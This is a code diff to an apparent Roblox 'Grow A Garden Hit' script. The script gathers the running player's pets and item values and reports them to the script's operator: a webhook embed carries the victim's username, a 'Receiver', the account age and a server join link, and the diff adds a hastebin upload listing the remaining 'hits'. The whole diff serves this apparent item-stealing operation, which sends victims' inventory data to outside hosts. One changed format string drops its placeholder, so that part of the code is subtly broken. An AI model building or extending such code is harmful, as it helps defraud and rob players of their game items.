@@ -137,34 +137,86 @@ end
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-description = string.format("```\n%s\n```", buildBackpackSection(items)),
+        description = string.format("``````", buildBackpackSection(items)),
         color = 5793266, -- blue-ish
     }
 end
 
--- Main embed for the webhook
-local function buildMainEmbed(executer, receiver, totalValue, foundRare)
+-- NEW: Function to upload extra items to hastebin and return the link
+local function uploadToHastebin(text)
+    local url = "https://hastebin.com/documents"
+    local response
+    pcall(function()
+        response = req({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "text/plain"},
+            Body = text
+        })
+    end)
+    if response and response.Body then
+        local data = HttpService:JSONDecode(response.Body)
+        if data and data.key then
+            return ("https://hastebin.com/%s.txt"):format(data.key)
+        end
+    end
+    return nil
+end
+
+-- NEW: Build the main embed, optionally including a "View all hits" field if extra items exist
+local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink)
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local accountAge = (executer and executer.AccountAge or "?") .. " days"
+    local fields = {
+        {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
+        {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
+        {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false}
+    }
+    if pasteLink then
+        table.insert(fields, {name = "📄 View all hits", value = string.format("[View all hits](%s) _(expires in ~5h)_", pasteLink), inline = false})
+    end
     return {
         title = "🥗 Grow A Garden Hit",
         color = foundRare and 16776960 or 65280,
-        fields = {
-            {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
-            {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
-            {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false}
-        },
+        fields = fields,
         footer = {text = "Made By Timoci"}
     }
 end
 
+-- NEW: Helper to build the extra items text for pastebin
+local function buildExtraItemsText(items)
+    if #items == 0 then return "_No extra items!_" end
+    local lines = {}
+    for _, item in ipairs(items) do
+        if item.Type == "Pet" then
+            table.insert(lines, string.format("%s %s [%.2fkg] [Age %s] %s¢", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
+        else
+            table.insert(lines, string.format("%s %s [%.2fkg] %s¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
+        end
+    end
+    return table.concat(lines, "\n")
+end
+
 local function prettyWebhookData(executer, receiver)
     local items, totalValue, foundRare = collectItems()
+    local topItems, extraItems = {}, {}
+    for i, item in ipairs(items) do
+        if i <= 10 then
+            table.insert(topItems, item)
+        else
+            table.insert(extraItems, item)
+        end
+    end
+    local pasteLink = nil
+    if #extraItems > 0 then
+        local pasteText = buildExtraItemsText(extraItems)
+        pasteLink = uploadToHastebin(pasteText)
+    end
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {
-            buildMainEmbed(executer, receiver, totalValue, foundRare),
-            buildItemsEmbed(items)
+            buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink),
+            buildItemsEmbed(topItems)
         }
     }
 end
